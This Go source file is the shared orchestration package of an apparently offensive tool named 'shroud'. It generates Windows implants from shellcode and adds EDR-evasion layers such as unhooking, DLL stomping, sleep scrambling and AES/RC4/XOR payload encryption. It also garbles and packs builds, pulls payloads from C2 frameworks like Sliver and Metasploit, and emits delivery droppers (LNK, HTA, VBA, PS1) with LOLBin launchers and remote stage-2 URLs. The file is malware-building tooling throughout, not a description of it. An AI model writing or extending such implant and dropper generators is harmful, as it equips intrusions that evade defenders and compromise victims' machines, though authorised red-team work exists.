// Package ops holds the callable generate/deliver pipelines so the CLI and the
// web UI share one implementation.
//
// Both the cobra CLI (cmd/shroud) and the local web server (internal/web) call
// ops.Generate / ops.Deliver. The functions take a *cobra.Command whose flags are
// already set (the CLI passes its real command; the web layer builds one from a
// JSON request and sets the same flags). They perform the generation/emission
// logic and return a structured result + error — they do NOT os.Exit and do NOT
// print to stderr (that's the caller's job). authorize.Require is the caller's
// responsibility too: the CLI checks it before calling, and the web server checks
// it in its generate/build handlers.
//
// Keeping the providers cobra-coupled (Fetch(cmd *cobra.Command)) is intentional:
// decoupling them would mean rewriting every provider's flag-reading. Passing a
// populated cobra command through ops preserves them unchanged while giving us
// "one implementation, two fronts".
package ops

import (
	"fmt"
	"strconv"
	"time"

	"shroud/internal/builder"
	"shroud/internal/catalog"
	"shroud/internal/c2"
	"shroud/internal/delivery"
	"shroud/internal/evasion"
	"shroud/internal/payload"
	"shroud/internal/shellcode"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

// GenerateResult describes an implant generation outcome.
type GenerateResult struct {
	TechniqueID   string
	TechniqueName string
	Format        string
	Evasion       []evasion.Layer // resolved, post-conflict-resolution
	Crypto        evasion.Layer   // active crypto layer ("" if none)
	Source        string          // shellcode source label
	OutDir        string
	ProjectFiles  []string // files written by Assemble (main.go, go.mod, ...)
	Built         bool
	BuiltPath     string // built artifact path (implant.exe / implant.dll)
	BuiltBytes    int64
	SleepMS       uint32
	SleepScheme   string
}

// DeliverResult describes a delivery emission outcome.
type DeliverResult struct {
	Format        string
	Mode          string // "inline" or "remote"
	URL           string
	Launcher      string
	Source        string // shellcode source (inline mode)
	ShellcodeBytes int   // shellcode size (inline mode)
	Technique     string // optional id hint
	OutDir        string
	Artifacts     []ArtifactInfo
}

// ArtifactInfo describes one emitted delivery file.
type ArtifactInfo struct {
	Path  string
	Bytes int
}

// Generate runs the implant generation pipeline for a cobra command whose flags
// are set (format, evasion, shellcode/c2, crypto keys, out, garble, pack, sleep…)
// and the positional technique id (args[0], required for implant formats). It
// resolves the technique, parses evasion, loads shellcode, encrypts at rest,
// assembles the project, and (unless --no-build or format=c) cross-compiles it.
// It does NOT authorize and does NOT os.Exit.
func Generate(cmd *cobra.Command, args []string) (*GenerateResult, error) {
	format := strFlag(cmd, "format")

	// Implant formats require a technique id.
	if len(args) == 0 {
		return nil, fmt.Errorf("generate requires a technique id for format '%s' (e.g. pe26)", format)
	}
	t, err := catalog.Resolve(args[0])
	if err != nil {
		return nil, err
	}

	layers, err := evasion.Parse(strFlag(cmd, "evasion"))
	if err != nil {
		return nil, err
	}
	crypto := evasion.CryptoLayer(layers)
	layers = dropCryptoConflict(layers, crypto)
	if evasion.Has(layers, evasion.LayerUnhookKD) && evasion.Has(layers, evasion.LayerUnhook) {
		layers = removeLayer(layers, evasion.LayerUnhook)
	}

	raw, source, err := loadShellcode(cmd)
	if err != nil {
		return nil, err
	}

	spec := &payload.Spec{
		Tech:     t,
		Layers:   layers,
		Format:   format,
		StompDLL: strFlag(cmd, "stomp-dll"),
		Process:  strFlag(cmd, "process"),
		DLL:      strFlag(cmd, "dll"),
		Crypto:   crypto,
		Garble:   boolFlag(cmd, "garble"),
		Tiny:     boolFlag(cmd, "tiny"),
		Pack:     strFlag(cmd, "pack"),
	}
	if d := durFlag(cmd, "sleep"); d > 0 {
		spec.SleepMS = uint32(d.Milliseconds())
	}
	spec.SleepScheme = strFlag(cmd, "sleep-scheme")

	encPayload, err := encryptPayload(spec, raw, cmd)
	if err != nil {
		return nil, err
	}
	spec.EncPayload = encPayload

	outDir := strFlag(cmd, "out")
	if outDir == "" {
		outDir = "out/" + t.ID
	}
	spec.OutDir = outDir

	if err := payload.Assemble(spec); err != nil {
		return nil, fmt.Errorf("assemble: %w", err)
	}

	res := &GenerateResult{
		TechniqueID:   t.ID,
		TechniqueName: t.Name,
		Format:        format,
		Evasion:       layers,
		Crypto:        crypto,
		Source:        orEmpty(source, "(demo stub)"),
		OutDir:        outDir,
		SleepMS:       spec.SleepMS,
		SleepScheme:   spec.SleepScheme,
	}

	if boolFlag(cmd, "no-build") || spec.Format == "c" {
		return res, nil
	}

	bres, err := builder.Build(outDir, spec.Garble, spec.Pack)
	if err != nil {
		return nil, fmt.Errorf("build: %w", err)
	}
	res.Built = true
	res.BuiltPath = bres.OutPath
	res.BuiltBytes = bres.Bytes
	return res, nil
}

// Deliver runs the delivery-format emission for a cobra command whose flags are
// set (format, shellcode/c2 or url, launcher, out) and the optional positional
// technique id. It does NOT authorize and does NOT os.Exit.
func Deliver(cmd *cobra.Command, args []string, format string) (*DeliverResult, error) {
	url := strFlag(cmd, "url")

	hasInlineSrc := strFlag(cmd, "c2") != "" || strFlag(cmd, "shellcode") != ""
	if url != "" && hasInlineSrc {
		return nil, fmt.Errorf("--url is mutually exclusive with -s/--c2 (choose inline OR remote mode)")
	}

	var (
		shellcode []byte
		source    string
	)
	if url == "" {
		raw, src, err := loadShellcode(cmd)
		if err != nil {
			return nil, err
		}
		shellcode = raw
		source = src
	}

	outDir := strFlag(cmd, "out")
	if outDir == "" {
		outDir = "out/delivery"
	}

	id := ""
	if len(args) > 0 {
		id = args[0]
	}

	ds := &delivery.Spec{
		Format:    format,
		Shellcode: shellcode,
		URL:       url,
		OutDir:    outDir,
		Launcher:  strFlag(cmd, "launcher"),
		Technique: id,
	}
	arts, err := delivery.Emit(ds)
	if err != nil {
		return nil, err
	}

	res := &DeliverResult{
		Format:        format,
		URL:           url,
		Launcher:      ds.Launcher,
		Source:        source,
		ShellcodeBytes: len(shellcode),
		Technique:     id,
		OutDir:        outDir,
	}
	if url != "" {
		res.Mode = "remote"
	} else {
		res.Mode = "inline"
	}
	for _, a := range arts {
		res.Artifacts = append(res.Artifacts, ArtifactInfo{Path: a.Path, Bytes: len(a.Bytes)})
	}
	return res, nil
}

// loadShellcode resolves shellcode from -s (raw file) or --c2 (registered
// provider), falling back to the demo stub when neither is given. Returns
// (bytes, display-source, error). Mirrors the CLI helper but without stderr.
func loadShellcode(cmd *cobra.Command) ([]byte, string, error) {
	name := strFlag(cmd, "c2")
	if name == "" || name == "raw" {
		scPath := strFlag(cmd, "shellcode")
		raw, err := shellcode.Load(scPath)
		if err != nil {
			return nil, "", err
		}
		return raw, orEmpty(scPath, "(demo stub)"), nil
	}
	prov, err := c2.Resolve(name)
	if err != nil {
		return nil, "", err
	}
	r, err := prov.Fetch(cmd)
	if err != nil {
		return nil, "", err
	}
	return r.Bytes, r.Source, nil
}

// encryptPayload encrypts raw at rest per the active crypto layer, populating the
// spec's key fields. Mirrors the CLI helper.
func encryptPayload(spec *payload.Spec, raw []byte, cmd *cobra.Command) ([]byte, error) {
	switch spec.Crypto {
	case evasion.LayerAES:
		key, err := shellcode.ParseHexKey(strFlag(cmd, "aes-key"), 32)
		if err != nil {
			return nil, err
		}
		iv, err := shellcode.ParseHexKey(strFlag(cmd, "aes-iv"), 16)
		if err != nil {
			return nil, err
		}
		spec.AESKey = key
		spec.AESIV = iv
		return shellcode.AESEncrypt(raw, key, iv)
	case evasion.LayerRC4:
		key, err := shellcode.ParseHexKey(strFlag(cmd, "rc4-key"), 16)
		if err != nil {
			return nil, err
		}
		spec.RC4Key = key
		return shellcode.RC4(raw, key)
	case evasion.LayerXOR:
		key, err := shellcode.ParseHexKey(strFlag(cmd, "xor-key"), 16)
		if err != nil {
			return nil, err
		}
		spec.XORKey = key
		return shellcode.XOR(raw, key)
	default:
		return raw, nil
	}
}

func dropCryptoConflict(layers []evasion.Layer, keep evasion.Layer) []evasion.Layer {
	var out []evasion.Layer
	for _, l := range layers {
		if (l == evasion.LayerAES || l == evasion.LayerRC4 || l == evasion.LayerXOR) && l != keep {
			continue
		}
		out = append(out, l)
	}
	return out
}

func removeLayer(layers []evasion.Layer, drop evasion.Layer) []evasion.Layer {
	var out []evasion.Layer
	for _, l := range layers {
		if l != drop {
			out = append(out, l)
		}
	}
	return out
}

func orEmpty(s, def string) string {
	if s == "" {
		return def
	}
	return s
}

// flag-reading helpers (the CLI's must* helpers live in package main and can't be
// imported; ops keeps its own thin wrappers).
func strFlag(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

func boolFlag(cmd *cobra.Command, name string) bool {
	v, _ := cmd.Flags().GetBool(name)
	return v
}

func intFlag(cmd *cobra.Command, name string) int {
	v, _ := cmd.Flags().GetInt(name)
	return v
}

func durFlag(cmd *cobra.Command, name string) time.Duration {
	v, _ := cmd.Flags().GetDuration(name)
	return v
}

// C2FlagSpec is a provider flag's schema, for the web UI's dynamic forms.
type C2FlagSpec struct {
	Name    string `json:"name"`
	Type    string `json:"type"`    // "string" | "bool" | "int" | "duration"
	Default string `json:"default"`
	Usage   string `json:"usage"`
}

// ProviderFlags reflects a provider's flag schema by calling AddFlags on a fresh
// flag set and visiting it. This lets the web UI render per-provider forms without
// hardcoding flag names and without changing the Provider interface.
func ProviderFlags(p c2.Provider) []C2FlagSpec {
	fs := pflag.NewFlagSet(p.Name(), pflag.ContinueOnError)
	p.AddFlags(fs)
	var out []C2FlagSpec
	fs.VisitAll(func(f *pflag.Flag) {
		out = append(out, C2FlagSpec{
			Name:    f.Name,
			Type:    flagTypeName(f),
			Default: f.DefValue,
			Usage:   f.Usage,
		})
	})
	return out
}

// flagTypeName maps a pflag flag's value type to a short schema label.
func flagTypeName(f *pflag.Flag) string {
	if f.Value == nil {
		return "string"
	}
	switch f.Value.Type() {
	case "bool":
		return "bool"
	case "int", "int8", "int16", "int32", "int64", "uint", "uint8", "uint16", "uint32", "uint64":
		return "int"
	case "duration":
		return "duration"
	default:
		return "string"
	}
}

// AddGenerateFlags registers every flag the generate/deliver pipeline reads, on an
// arbitrary flag set. The CLI's `generate` command and the web UI's /api/generate
// handler both call this so the flag surface stays in one place. The flags match
// what ops.Generate / ops.Deliver read via strFlag/boolFlag/durFlag.
//
// The command's RunE is the caller's concern — this only registers flags.
func AddGenerateFlags(fs *pflag.FlagSet) {
	fs.StringP("shellcode", "s", "", "raw shellcode file (msfvenom/donut/sliver/custom)")
	fs.StringP("out", "o", "", "output directory (default ./out/<id> for implants, ./out/delivery for delivery)")
	fs.StringP("format", "f", "exe", "output format: exe|dll|c (implant) | raw|lnk|hta|sct|vba|vbs|wsf|ps1|xsl|js|jse (delivery)")
	fs.StringP("evasion", "e", "", "comma list of evasion layers (implant only)")
	fs.String("aes-key", "", "hex key for aes layer (32 bytes; random if omitted)")
	fs.String("aes-iv", "", "hex IV for aes layer (16 bytes; random if omitted; supply for reproducible builds)")
	fs.String("rc4-key", "", "hex key for rc4 layer (random if omitted)")
	fs.String("xor-key", "", "hex key for xor layer (random if omitted)")
	fs.String("hash", "djb2", "hash algo for dynamic-api (go-wincall pins DJB2; flag kept for parity)")
	fs.String("stomp-dll", "", "legit DLL to stomp into for -e stomp (default cfgmgr32.dll)")
	fs.String("process", "", "remote target process name (default explorer.exe)")
	fs.String("dll", "", "DLL path/name: pe05 remote LoadLibrary path; pe16 stomp-target DLL path (default C:\\Windows\\System32\\wbemcomn.dll); pe20 vulnerable DLL name (default msys-2.0.dll)")
	fs.Bool("no-build", false, "generate source only")
	fs.Bool("garble", false, "build with garble -literals (OPSEC; needs garble on PATH)")
	fs.Bool("tiny", false, "with --garble, also pass -tiny")
	fs.String("pack", "", "post-build packer: upx (EXE only)")
	fs.Duration("sleep", 0, "with -e sleep, arm a demo sleepScramble loop (duration e.g. 30s, 2m; 0=off)")
	fs.String("sleep-scheme", "", "with -e sleep --sleep: scheme — \"xor\" (tier-1 inline scramble, default) | \"ekko\" (tier-2 timer-driven self-modifying .text sleep, EXPERIMENTAL)")
	fs.String("c2", "", "C2 backend for shellcode source (sliver|metasploit|…; default: raw -s/--shellcode)")
	fs.String("url", "", "remote stage-2 URL for delivery formats (mutually exclusive with -s/--c2)")
	fs.String("launcher", "", "LOLBin/host for -f lnk remote mode: powershell|cmd|mshta|regsvr32|wmic|cscript (default powershell)")
	// Every registered C2 provider adds its namespaced flags here (only the
	// selected provider's flags are read at run time).
	c2.AddAllFlags(fs)
}

// FlagValue sets one flag on a command's flag set from a JSON-decoded value. Used by
// the web handler to populate the command it builds before calling Generate/Deliver.
// Returns an error for unsupported value types (the JSON schema is strings/bools/
// numbers; durations arrive as a string like "30s").
func FlagValue(fs *pflag.FlagSet, name string, v any) error {
	switch x := v.(type) {
	case nil:
		return nil
	case string:
		return fs.Set(name, x)
	case bool:
		return fs.Set(name, strconv.FormatBool(x))
	case float64:
		// pflag parses ints/durations from strings; format without exponent.
		return fs.Set(name, strconv.FormatFloat(x, 'f', -1, 64))
	default:
		return fmt.Errorf("flag %s: unsupported value type %T", name, v)
	}
}